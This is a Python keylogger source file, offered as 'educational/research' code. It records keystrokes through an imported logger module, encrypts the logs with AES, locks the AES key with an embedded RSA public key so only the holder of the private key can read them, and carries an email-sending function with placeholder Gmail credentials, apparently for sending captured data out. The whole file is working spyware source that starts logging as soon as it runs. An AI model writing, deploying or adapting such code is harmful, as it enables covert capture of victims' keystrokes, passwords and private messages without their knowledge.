#/usr/bin/python3

# Warning Before Using :
# 1. This Project/Code/Script is provided "AS IS" Without any warranty 
# 2. This is done for Educational/Research Purpose ONLY.Full Responsibility is of the user using it.
# 3. I am not responsible for any harm/problem/issue that may occour, due to use of this code anywhere.
# Author : xtreme.research@gmail.com

import pyaes                                                              # Only for AES 
import os                                                                 # AES Random Number Generation using os.urandom
from logger import Logger                                                 # Logger Runs on Seperate Thread
import time                                                               
from Crypto.PublicKey import RSA                                          # To Encrypt AES Key 
import sys                                                                   

#fw = open('public_key.pem','r')                # Optionally the Public key can be read from a file or any 
#public_key = fw.read()                         # online link, but as public key exposure is not very harmful
#fw.close()                                     # it is okay to store it in source. even though it can be 
                                                # reverse engineered!

USER_ID = '#Host or temp email id '             # Prototype Email Functionality Login credentials
PASSWD  = '#host password'

def send_email(recipient, subject, body):       # Prototype Function to Send Email from host using SSL
    import smtplib
    FROM = USER_ID
    TO = recipient 
    SUBJECT = subject
    TEXT = body
    # Prepare actual message
    message = """From: %s\nTo: %s\nSubject: %s\n\n%s
    """ % (FROM, ", ".join(TO), SUBJECT, TEXT)
    try:
        server_ssl = smtplib.SMTP_SSL("smtp.gmail.com", 465)
        server_ssl.ehlo()
        server_ssl.login(USER_ID,PASSWD)  
        server_ssl.sendmail(FROM, TO, message)
        server_ssl.close()
    except:
        pass
    
#Public key of RSA To encrypt the AES Key

public_key = '''-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAvapqD4ZpP4P8FDVisTif
sLETrgPXGZ4pidn3K75/szIxyAAAm8WDhSJi7ajt1cjldwgCO70U0DmcsofhtdG1
VF7JMLVnoapcBcWFN8HDzQe+d+kiSbfZLn84HiUWhgLQppayiFKOcP2PSC+ZFZ/R
zNtjhhtn04OQemyOmkcomKRCFIg7scX8IZyQBR7In8R7ylUs7YeOglys8N9CRLdn
hTtLTxECjx/UToA8rywzAW47NPf2HR47JViAgujJKBtKTSzuifokG7jZn6WCB63Q
E6HaofzR6IigxrmilutDMF8tCF21/c4XNfqXUIDolpyjBJ+s2bpTxHrkeQ4wzQXq
V7iQkmephQxse7+ze17WzWYXCJi580IxHStiBqZeDKMQbCbbjmLcA/hg4lbegm5T
fpBXFI3GrO6VYN7AigDlU492QEpVUd+7y/L2ztx7iv3Q9fLvh4TdFMITlAdj4TDn
ouRYxn5BO3Gf4JlZhl5v2WAuWCfcjnsajlVPZPLrSw1hXPJtM7h00hbsEGeBtwwM
T6juxXmjz5L+7aazqwGr2/HMrt6hMHczv9UR2rKjMKiuef0hhKyFjHJ80HzubKIN
29OyB7TxViSiiZeF2qpzX1NbBdRgY6p1ONAMD0vzZq9WPk6dGXLGrWo2srSqQVsd
rleEd/m4Ab7BvcCcXd7fYusCAwEAAQ==
-----END PUBLIC KEY-----'''

#The OOP Approach
class KeyLogger:
    def __init__(self,RSA_PUBLIC_KEY,LOG_FILE_NAME='LogFile.bin',KEY_FILE_NAME='AESKey.bin'):
        self.init_RSA_Object(RSA_PUBLIC_KEY)  # Initialize a RSA Public Key object that can encrypt data
        self.logfile = LOG_FILE_NAME          # Logfile to store Logs
        self.KEY_FILE_NAME = KEY_FILE_NAME    # Keyfile to store RSA Encrypted AES Key 

        self.aes = self.generate_AES_Object() # Generates an AES Object that encrypts logs
        
        self.file = open(self.logfile,'wb')   
        self.Handle = Logger()                
        self.Handle.start()                  # start logging on seperate thread
        
    def init_RSA_Object(self,public_key):
        #print("RSA Onject Initialized")
        self.pub_key = RSA.importKey(public_key)  # RSA Public Key Object

    def export_AES_key(self,key):
        #print("Exporting AES Key")
        fw = open(self.KEY_FILE_NAME,'wb')
        enc = self.RSA_Encrypt(self.AES_KEY)      # AES Key is exported after getting encrypted by RSA Public key
        fw.write(enc)
        fw.close()

    def RSA_Encrypt(self,data):
        #print("Encrypting +"+str(data))
        enc = self.pub_key.encrypt(data,32)[0]
        return enc

    def generate_AES_Object(self):                 # generate random AES Key and AES Object
        self.AES_KEY = os.urandom(32) #256 Bits AES
        self.export_AES_key(self.AES_KEY)           
        #print(self.AES_KEY)
        aes = pyaes.AESModeOfOperationCTR(self.AES_KEY)
        return aes
    
    def start(self):
        while True:
            self.new_logs = self.Handle.export_log()  # get current logs
            if (len(self.new_logs) != 0):            
                self.Handle.clear_log() 
                for self.log in self.new_logs:           
                    #print(self.log)
                    self.enc_log = self.aes.encrypt(str(self.log).encode()) 
                    #print(self.enc_log)
                    del self.new_logs[0]              # delete log from list to save RAM and increase Security
                    self.file.write(self.enc_log)     # Write to logfile

    def __del__(self):
        self.file.close()                             # logfile is closed when __del__ is called in the end

X = KeyLogger(public_key)
X.start()                                             # ..Starts Logging Data..
